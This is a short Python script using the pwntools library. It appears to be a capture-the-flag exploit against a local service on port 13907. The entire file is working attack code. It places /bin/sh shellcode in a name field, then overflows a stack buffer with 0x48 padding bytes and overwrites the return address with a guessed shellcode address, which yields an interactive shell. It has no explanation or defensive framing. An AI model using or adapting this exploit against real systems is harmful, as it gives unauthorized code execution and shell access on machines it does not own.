from pwn import *

r = remote("127.0.0.1", 13907)
# context.log_level = "debug"
context(os="linux", arch="amd64")
RND = 5  # 1-8
shellcode = asm(shellcraft.sh())
name = shellcode + b"A" * (64 - len(shellcode))
r.recvuntil(b"what's your name: ")
r.send(name)

overflow_padding = b"A" * 0x48
shellcode_addr = p64((RND + 0x20) << 12)
overflow = overflow_padding + shellcode_addr
r.recvuntil(b"try to overflow me~")
r.sendline(overflow)
r.interactive()